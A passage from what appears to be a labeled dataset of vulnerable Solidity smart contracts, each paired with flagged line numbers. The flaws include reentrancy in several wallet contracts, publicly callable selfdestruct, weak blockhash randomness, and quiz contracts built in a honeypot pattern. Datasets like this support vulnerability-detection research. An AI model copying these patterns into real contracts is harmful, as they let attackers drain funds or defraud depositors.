contract WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.20;
contract WECANGAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract WE_GAME
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.14;
contract WONO_ICO {
    uint closed;
    struct Deposit { address buyer; uint amount; }
    uint refundDate;
    address fiduciary = msg.sender;
    Deposit[] Deposits;
    mapping (address => uint) total;
    function() public payable { }
    function init(uint date)
    {
        refundDate = date;
    }
    function deposit()
    public payable {
        if (msg.value >= 0.5 ether && msg.sender == tx.origin)
        {
            Deposit newDeposit;
            newDeposit.buyer = msg.sender;
            newDeposit.amount = msg.value;
            Deposits.push(newDeposit);
            total[msg.sender] += msg.value;
        }
        if (this.balance >= 50 ether)
        {
            closed = now;
        }
    }
    function refund(uint amount)
    public {
        if (total[msg.sender] >= amount && amount > 0)
        {
            if (now >= refundDate && closed == 0)
            {
                msg.sender.transfer(amount);
            }
        }
    }
    function close()
    public {
        if (msg.sender == fiduciary)
        {
            closed = now;
            msg.sender.transfer(this.balance);
        }
    }
}",[33]
"pragma solidity ^0.4.16;
interface Token {
    function transfer(address receiver, uint amount) public;
}
contract WRTCrowdsale {
    Token public tokenReward;
    address creator;
    address owner = 0x7f9c7CB1e4A8870849BF481D35EF088d6a456dbD;
    uint256 public startDate;
    uint256 public endDate;
    uint256 public price;
    event FundTransfer(address backer, uint amount, bool isContribution);
    function WRTCrowdsale() public {
        creator = msg.sender;
        startDate = 1514329200;     // 27/12/2017
        endDate = 1521586800;       // 20/03/2018
        price = 500;
        tokenReward = Token(0x973dc0c65B3eF4267394Cf9A1Fa1582827D9053f);
    }
    function setOwner(address _owner) public {
        require(msg.sender == creator);
        owner = _owner;      
    }
    function setCreator(address _creator) public {
        require(msg.sender == creator);
        creator = _creator;      
    }    
    function setStartDate(uint256 _startDate) public {
        require(msg.sender == creator);
        startDate = _startDate;      
    }
    function setEndDate(uint256 _endDate) public {
        require(msg.sender == creator);
        endDate = _endDate;      
    }
    function setPrice(uint256 _price) public {
        require(msg.sender == creator);
        price = _price;      
    }
    function sendToken(address receiver, uint amount) public {
        require(msg.sender == creator);
        tokenReward.transfer(receiver, amount);
        FundTransfer(receiver, amount, true);    
    }
    function () payable public {
        require(msg.value > 0);
        require(now > startDate);
        require(now < endDate);
        uint amount = msg.value * price;
        // Pre-sale 12/27   01/27
        if(now > startDate && now < 1517094000) {
            amount += amount / 2;
        }
        // Pre-ICO  02/01   02/28
        if(now > 1517439600 && now < 1519772400) {
            amount += amount / 3;
        }
        // ICO      03/10   03/20
        if(now > 1520636400 && now < 1521500400) {
            amount += amount / 4;
        }
        tokenReward.transfer(msg.sender, amount);
        FundTransfer(msg.sender, amount, true);
        owner.transfer(msg.value);
    }
}",[59]
"pragma solidity ^0.4.25;
contract WWW_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function WWW_WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract WWW_wallet
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function WWW_wallet(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract W_WALLET
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function W_WALLET(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.4;
contract AbstractToken {
    /// @return total amount of tokens
    function totalSupply() constant returns (uint256 supply) {}
    /// @param _owner The address from which the balance will be retrieved
    /// @return The balance
    function balanceOf(address _owner) constant returns (uint256 balance) {}
    /// @notice send `_value` token to `_to` from `msg.sender`
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return Whether the transfer was successful or not
    function transfer(address _to, uint256 _value) returns (bool success) {}
    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`
    /// @param _from The address of the sender
    /// @param _to The address of the recipient
    /// @param _value The amount of token to be transferred
    /// @return Whether the transfer was successful or not
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}
    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @param _value The amount of wei to be approved for transfer
    /// @return Whether the approval was successful or not
    function approve(address _spender, uint256 _value) returns (bool success) {}
    /// @param _owner The address of the account owning tokens
    /// @param _spender The address of the account able to transfer the tokens
    /// @return Amount of remaining tokens allowed to spent
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}
contract StandardToken is AbstractToken {
    function transfer(address _to, uint256 _value) returns (bool success) {
        //Default assumes totalSupply can't be over max (2^256 - 1).
        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.
        //Replace the if with this one instead.
        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { return false; }
    }
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {
        //same as above. Replace this line with the following if you want to protect against wrapping uints.
        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { return false; }
    }
    function balanceOf(address _owner) constant returns (uint256 balance) {
        return balances[_owner];
    }
    function approve(address _spender, uint256 _value) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }
    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {
      return allowed[_owner][_spender];
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    uint256 public totalSupply;
}
//name this contract whatever you'd like
contract WayBackToken is StandardToken {
    function () {
        return kill();
    }
    function kill()  public {
        selfdestruct(address(this));
    }
    /* Public variables of the token */
    /*
    NOTE:
    The following variables are OPTIONAL vanities. One does not have to include them.
    They allow one to customise the token contract & in no way influences the core functionality.
    Some wallets/interfaces might not even bother to look at this information.
    */
    string public name = 'WayBack Token';     //fancy name: eg Simon Bucks
    uint8 public decimals = 7;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.
    string public symbol = 'WBT';                 //An identifier: eg SBX
    string public version = 'H0.2';       //human 0.1 standard. Just an arbitrary versioning scheme.
//
// CHANGE THESE VALUES FOR YOUR TOKEN
//
//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token
    function WayBackToken(
        ) {
        balances[msg.sender] = 100000000;               // Give the creator all initial tokens (100000 for example)
        totalSupply = 100000000;                        // Update total supply (100000 for example)
        name = 'WayBack Token';                                   // Set the name for display purposes
        decimals = 7;                            // Amount of decimals for display purposes
        symbol = ""WBT"";                               // Set the symbol for display purposes
    }
    /* Approves and then calls the receiving contract */
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.
        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}","[48, 72, 73, 75, 76]"
"   function setVoteBonusContract(address voteBonusAddr)public onlyOwner{
       voteBonus = voteBonusSystem(voteBonusAddr);
   }
   function setEverydayBonusContract(address everydayBonusAddr)public onlyOwner{
       everydayBonus = everydayBonusSystem(everydayBonusAddr);
   }
   function setVIPSystemContract(address vipAddr)public onlyOwner{
       vip = VIPSystem(vipAddr);
   }
   function setWCGSystemContract(address wcgSystemAddr)public onlyOwner{
       wcg = WCGSystem(wcgSystemAddr);
   }
   function ethbuyToKen(uint256 _price)public payable{
       require(msg.value == _price);
       (address _addr,uint _eth,uint _wcg,uint256 _index) = wcg.buyWCG(msg.sender,msg.value);
       address(this).transfer(msg.value);
       emit buyEvent(_addr,_eth,_wcg,_index);
   }
   function sell(uint256 _wcg)public{
       (uint256 price,address _addr,uint256 _eth,uint256 __wcg,uint256 _index) = wcg.sellWCG(msg.sender,_wcg);
       require(price != 0);
       msg.sender.transfer(price);
       emit sellEvent(_addr,_eth,__wcg,_index);
   }
   function totalSupply()public view returns(uint256){
       return data.getTotalWcg();
   }
   function sellToken(uint _wcg)public view returns(uint256){
       return data.wcgTrunEth(_wcg);
   }
   function ethTrunWcg(uint256 price)public view returns(uint256){
       return data.ethTrunWcg(price);
   }
   function computingCharge(uint _eth)public view returns(uint256){
       return data.computingCharge(_eth);
   }
   function currentPrice()public view returns(uint256){
       return data.currentPrice();
   }
   function balanceOf(address who)public view returns(uint256){
       return data.getUserWCG(who);
   }
   function wcgTrunEth(uint256 _wcg)public view returns(uint256){
       return data.wcgTrunEth(_wcg);
   }
   function wcgInfosOf(uint index)public view returns(address,uint256,uint256,uint8){
       return data.wcgInfosOf(index);
   }
   function getWcgInfosLength()public view returns(uint){
        return data.getWcgInfosLength();
   }
  function bonusSystem() public{
     (address _addr,uint256 _userBonus,uint256 _index)= everydayBonus.bonusSystem(msg.sender);
     require(_userBonus != 0 );
     msg.sender.transfer(_userBonus);
     emit bonusEvent(_addr,_userBonus,_index);
  }
  function wcgBonusPool()public view returns(uint256){
     return data.getWcgBonusPool();
  }
  function drawProposalBouns()public{
      uint256 userBonus = voteBonus.drawProposalBouns(msg.sender);
      require(userBonus != 0 );
      msg.sender.transfer(userBonus);
  }
  function voteBonusPool()public view returns(uint256){
      return data.getVoteBonusPool();
  }
  function vote(uint256 index,uint256 _wcg)public{
      require(voteBonus.vote(msg.sender,index,_wcg));
  }
  function paymentVipOfEth(uint256 series)public payable{
      if(data.getLevel(series)==0)revert();
      if(msg.value < series*0.02 ether)revert();
      (address addr,uint256 _series,uint256 createId,uint256 index,uint price,uint256 __index) = vip.paymentVipOfEth(msg.sender,series,msg.value);
      address(this).transfer(msg.value);
      emit paymentVipEvent(addr,_series,createId,index,price,__index);
  }
  function paymentVipOfWcg(uint256 series)public{
      if(data.getLevel(series)==0)revert();
      if(data.getUserWCG(msg.sender) / data.getT() < series * 1)revert();
      (address addr,uint256 _series,uint256 createId,uint256 index,uint price,uint256 __index) = vip.paymentVipOfWcg(msg.sender,series);
      emit paymentVipEvent(addr,_series,createId,index,price,__index);
  }
  function putaway(uint256 _vipId,uint256 price)public{
      (uint256 series,uint pc,uint256 _orderId,uint256 c) = vip.putaway(msg.sender,_vipId,price);
      emit orderEvent(msg.sender,series,pc,_orderId,data.indexIncrement(),c);
  }
  function recall(uint256 orderId)public{
      require(vip.recall(orderId));
      emit recallEvent(data.indexIncrement());
  }
  function sellVip(uint256 orderId)public payable{
      (uint256 price,address addr) = vip.sellVip(msg.sender,orderId,msg.value);
      require(price != 0 && addr != 0x0);
      address(addr).transfer(price);
      emit sellVipEvent(data.indexIncrement());
  }
  function serviceCharge(uint256 eth)public view returns(uint256,uint256){
      (uint256 price1,uint256 price2) = data.serviceCharge(eth);
      return (price1,price2);
  }
  function getAllOrdersLength()public view returns(uint){
      return data.getAllOrdersLength();
  }
  function allOrders(uint256 index)public view returns(uint256){
      return data.allOrders(index);
  }
  function userOrders(uint256 _orderId)public view returns(address,uint256,uint256,uint256,uint256,uint256,uint256){
      return data.getUserOrders(_orderId);
  }
  function userVipsOf(address addr,uint index)public view returns(uint256,uint256,uint,uint256){
      return data.getUserVips(addr,index);
  }
  function getUserVipsLength()public view returns(uint256){
      return data.getUserVipsLength(msg.sender);
  }
  function level(uint256 series)public view returns(uint256){
      return data.getLevel(series);
  }
  function()public payable{}
  function destroy()public onlyOwner {
      selfdestruct(owner);
  }
  function withdraw()public onlyOwner{
      owner.transfer(address(this).balance);
  }
  function recharge()public payable onlyOwner{",[64]
"    address _beneficiary,
    uint256 _tokenAmount
  ) internal {
    token.safeTransfer(_beneficiary, _tokenAmount);
  }
  function _getBonus(uint256 _tokens) internal view returns (uint256) {
    return getRealAmountBonus(FOR_SALE, sold, _tokens);
  }
  function getRealAmountBonus(uint256 _forSale, uint256 _sold, uint256 _tokens) public pure returns (uint256) {
    uint256 bonus = getAmountBonus(_tokens);
    uint256 left = _forSale.sub(_sold).sub(_tokens);
    if (left > bonus) {
      return bonus;
    } else {
      return left;
    }
  }
  function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256, uint256) {
    return getTokenAmount(sold, _weiAmount);
  }
  function getTokenAmount(uint256 _sold, uint256 _weiAmount) public view returns (uint256 tokens, uint256 left) {
    left = _weiAmount;
    while (left > 0) {
      (uint256 currentTokens, uint256 currentLeft) = getTokensForStage(_sold.add(tokens), left);
      if (left == currentLeft) {
        return (tokens, left);
      }
      left = currentLeft;
      tokens = tokens.add(currentTokens);
    }
  }
  /**
   * @dev Calculates tokens for this stage
   * @return Number of tokens that can be purchased in this stage + wei left
   */
  function getTokensForStage(uint256 _sold, uint256 _weiAmount) public view returns (uint256 tokens, uint256 left) {
    (uint8 stage, uint256 limit, uint256 rate) = getStage(_sold);
    if (stage == 4) {
      return (0, _weiAmount);
    }
    if (stage == 0 && now > END) {
      revert(""Sale is refundable, unable to buy"");
    }
    tokens = _weiAmount.mul(rate);
    left = 0;
    (uint8 newStage,,) = getStage(_sold.add(tokens));
    if (newStage != stage) {
      tokens = limit.sub(_sold);
      //alternative to Math.ceil(tokens / rate)
      uint256 weiSpent = (tokens.add(rate).sub(1)).div(rate);
      left = _weiAmount.sub(weiSpent);
    }
  }
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount,
    uint256 _tokens
  ) internal {
    super._updatePurchasingState(_beneficiary, _weiAmount, _tokens);
    sold = sold.add(_tokens);
  }
  function isRefundable() public view returns (bool) {
    (uint8 stage,,) = getStage(sold);
    return now > END && stage == 0;
  }
  function getStage(uint256 _sold) public pure returns (uint8 stage, uint256 limit, uint256 rate) {
    if (_sold < STAGE1) {
      return (0, STAGE1, RATE1);
    } else if (_sold < STAGE2) {
      return (1, STAGE2, RATE2);
    } else if (_sold < STAGE3) {
      return (2, STAGE3, RATE3);
    } else if (_sold < STAGE4) {
      return (3, STAGE4, RATE4);
    } else {
      return (4, 0, 0);
    }
  }
  function getAmountBonus(uint256 _tokens) public pure returns (uint256) {
    if (_tokens < BONUS_STAGE1) {
      return 0;
    } else if (_tokens < BONUS_STAGE2) {
      return BONUS1;
    } else if (_tokens < BONUS_STAGE3) {
      return BONUS2;
    } else if (_tokens < BONUS_STAGE4) {
      return BONUS3;
    } else {
      return BONUS4;
    }
  }
}",[64]
"        } else {
            uint256 winersBet = bets[_winer][resultWin];
            require(winersBet > 0);
            bets[_winer][resultWin] = 0;
            playerCount[resultWin]--;
            _winer.transfer(winersBet + winersBet * winRatio / RR);
        }
    }
    function getStatistics() external view returns (uint256[2 * ArraySize] memory) {
        uint256[2 * ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = betAmount[i];
            output[i + ArraySize] = playerCount[i];
        }
        return output;
    }
    function getPlayerStatistics(address _player) external view returns (uint256[ArraySize] memory) {
        uint256[ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = bets[_player][i];
        }
        return output;
    }
    function endBetPeriod() external onlySiths {
        endBetting = true;
    }
    function setResult(uint32 _result) external onlySiths {
        require(_result >=  firstHero || _result <= lastHero);
        require(startPayment == false);
        if (betAmount[_result] == 0) {
            startWithdraw();
            return;
        }
        uint256 donation = (address(this).balance - betAmount[_result]) / 10;
        Martin.transfer(donation / 2);
        George.transfer(donation / 2);
        uint256 totalBets = (address(this).balance - betAmount[_result]);
        winRatio = totalBets * RR / betAmount[_result];
        resultWin = _result;
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
    }
    function startWithdraw() public onlySiths {
        require(startPayment == false);
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
        if (resultWin != Withdraw) {
            resultWin = Withdraw;
        }
    }
    function pauseOn() external onlySiths {
        onPause = true;
    }
    function pauseOff() external onlySiths {
        onPause = false;
    }
    function clearBlockchain() external {
        require(startPayment && endBetting);
        if (resultWin == Withdraw) {
            require(address(this).balance < minBet);
            selfdestruct(msg.sender);
        } else {
            require(playerCount[resultWin] == 0);
            selfdestruct(msg.sender);
        }
    }
    function addSith(address _sith) external onlySiths {
        sith[_sith] = true;
        sithCount++;
    }
    function delSith(address _sith) external onlySiths {
        require(sithCount >= 2);
        sith[_sith] = false;
        sithCount--;
    }
}","[61, 65, 68]"
"        } else {
            uint256 winersBet = bets[_winer][resultWin];
            require(winersBet > 0);
            bets[_winer][resultWin] = 0;
            playerCount[resultWin]--;
            _winer.transfer(winersBet + winersBet * winRatio / RR);
        }
    }
    function getStatistics() external view returns (uint256[2 * ArraySize] memory) {
        uint256[2 * ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = betAmount[i];
            output[i + ArraySize] = playerCount[i];
        }
        return output;
    }
    function getPlayerStatistics(address _player) external view returns (uint256[ArraySize] memory) {
        uint256[ArraySize] memory output;
        for(uint256 i = firstHero; i <= lastHero; i++) {
            output[i] = bets[_player][i];
        }
        return output;
    }
    function endBetPeriod() external onlySiths {
        endBetting = true;
    }
    function setResult(uint32 _result) external onlySiths {
        require(_result >=  firstHero || _result <= lastHero);
        require(startPayment == false);
        if (betAmount[_result] == 0) {
            startWithdraw();
            return;
        }
        uint256 donation = (address(this).balance - betAmount[_result]) / 10;
        Martin.transfer(donation / 2);
        George.transfer(donation / 2);
        uint256 totalBets = (address(this).balance - betAmount[_result]);
        winRatio = totalBets * RR / betAmount[_result];
        resultWin = _result;
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
    }
    function startWithdraw() public onlySiths {
        require(startPayment == false);
        startPayment = true;
        if (endBetting != true) {
            endBetting = true;
        }
        if (resultWin != Withdraw) {
            resultWin = Withdraw;
        }
    }
    function pauseOn() external onlySiths {
        onPause = true;
    }
    function pauseOff() external onlySiths {
        onPause = false;
    }
    function clearBlockchain() external {
        require(startPayment && endBetting);
        if (resultWin == Withdraw) {
            require(address(this).balance < minBet);
            selfdestruct(msg.sender);
        } else {
            require(playerCount[resultWin] == 0);
            selfdestruct(msg.sender);
        }
    }
    function addSith(address _sith) external onlySiths {
        sith[_sith] = true;
        sithCount++;
    }
    function delSith(address _sith) external onlySiths {
        require(sithCount >= 2);
        sith[_sith] = false;
        sithCount--;
    }
}","[61, 65, 68]"
"pragma solidity ^0.4.20;
contract Who_Wants_to_Be_a_Millionaire
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_game(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;
contract WillstDuMeinTrauzeugeSein {
    bool private antwort;  // Erste 32 Bytes des Storage
    bytes32 private hash = 0x44cb61ba64c1b4708acd17c0bc86a0a4eec01308bb674b33ef8d477a5831831a;
    function ja (string calldata geheimnis) public {
        require(sha256(bytes(geheimnis)) == hash);
        antwort = true;
    }
    function nein (string calldata geheimnis) public {
        require(sha256(bytes(geheimnis)) == hash);
        require(!antwort);
        selfdestruct(payable(msg.sender));
    }
}","[10, 13]"
"	}
    function buyTicketWithRef(address _ref) public payable{
       require(msg.value == ticketPrice);
       bool found = false;
       for(uint i=0; i< games[block.number+blockOffset].gamers.length;i++){
        	      if( msg.sender == games[block.number+blockOffset].gamers[i]){
        	        found = true;
        	        break;
        	      }
        	    }
        	    require(found == false);
	    jackpot+=msg.value;
	    games[block.number+blockOffset].gamers.push(msg.sender);
	    games[block.number+blockOffset].pays[msg.sender] = false;
	    if( _ref != address(0) && comission.referal>0){
	        referalProfits[_ref]+= msg.value*comission.referal/100;
	        bool _found = false;
	        for(i = 0;i<referals.length;i++){
	            if( referals[i] == _ref){
	                _found=true;
	                break;
	            }
	        }
	        if(!_found){
	            referals.push(_ref);
	        }
	    }
    }
	function buyTicket() public payable {
	    require(msg.value == ticketPrice);
	    bool found = false;
	    for(uint i=0; i< games[block.number+blockOffset].gamers.length;i++){
	      if( msg.sender == games[block.number+blockOffset].gamers[i]){
	        found = true;
	        break;
	      }
	    }
	    require(found == false);
	    jackpot+=msg.value;
	    games[block.number+blockOffset].gamers.push(msg.sender);
	    games[block.number+blockOffset].pays[msg.sender] = false;
	}
	function getLotteryAtIndex(uint _index) public view returns(
		address[] _gamers,
		uint _jackpot
	) {
        _gamers = games[_index].gamers;
        _jackpot = jackpot;
	}
    function _checkWin( uint _blockIndex, address candidate) internal view returns(uint) {
            uint32 blockHash = uint32(blockhash(_blockIndex));
            uint32 hit = blockHash ^ uint32(candidate);
            bool hit1 = (hit & 0xF == 0)?true:false;
            bool hit2 = (hit1 && ((hit & 0xF0)==0))?true:false;
            bool hit3 = (hit2 && ((hit & 0xF00)==0))?true:false;
            bool _found  = false;
            for(uint i=0;i<games[_blockIndex].gamers.length;i++){
                if(games[_blockIndex].gamers[i] == candidate) {
                    _found = true;
                }
            }
            if(!_found) return 0;
            uint amount = 0;
            if ( hit1 ) amount = 2*ticketPrice;
            if ( hit2 ) amount = 4*ticketPrice;
            if ( hit3 ) amount = jackpot;
            return amount;
    }
    function checkWin( uint _blockIndex, address candidate) public view returns(
        uint amount
        ){
            amount = _checkWin(_blockIndex, candidate);
        }
	function withdrawForWinner(uint _blockIndex) public {
	    require((block.number - 100) < _blockIndex );
		require(games[_blockIndex].gamers.length > 0);
		require(games[_blockIndex].pays[msg.sender]==false);
		uint amount =  _checkWin(_blockIndex, msg.sender) ;
		require(amount>0);
		address winner = msg.sender;
		if( amount > jackpot) amount=jackpot;
		if( amount == jackpot) amount = amount*99/100;
		games[_blockIndex].pays[msg.sender] = true;
		uint winnerSum = amount*(100-comission.total)/100;
		uint techSum = amount-winnerSum;
		winner.transfer( winnerSum );
		for(uint i=0;i<referals.length;i++){
		    if( referalProfits[referals[i]]>0 && referalProfits[referals[i]]<techSum){
		        referals[i].transfer( referalProfits[referals[i]]);
		        techSum -= referalProfits[referals[i]];
		        referalProfits[referals[i]] = 0;
		 }
		}
		if( techSum > 0){
		  owner.transfer(techSum);
		}
		jackpot = jackpot-amount;
	}
	function getJackpot() public view returns(uint){
	    return jackpot;
	}
	function getAdminComission() public view returns(uint){
	    return adminComission;
	}
    function balanceOf(address _user) public view returns(uint) {
		return referalProfits[_user];
    }
	/**
	 * @dev Disallow users to send ether directly to the contract
	 */
	function() public payable {
	    if( msg.sender != owner){
	        revert();
	    }
	    jackpot += msg.value;
	}
}","[39, 87, 89]"
"pragma solidity ^0.4.20;
contract Win_Some_Ether
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function init_quiz_game(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
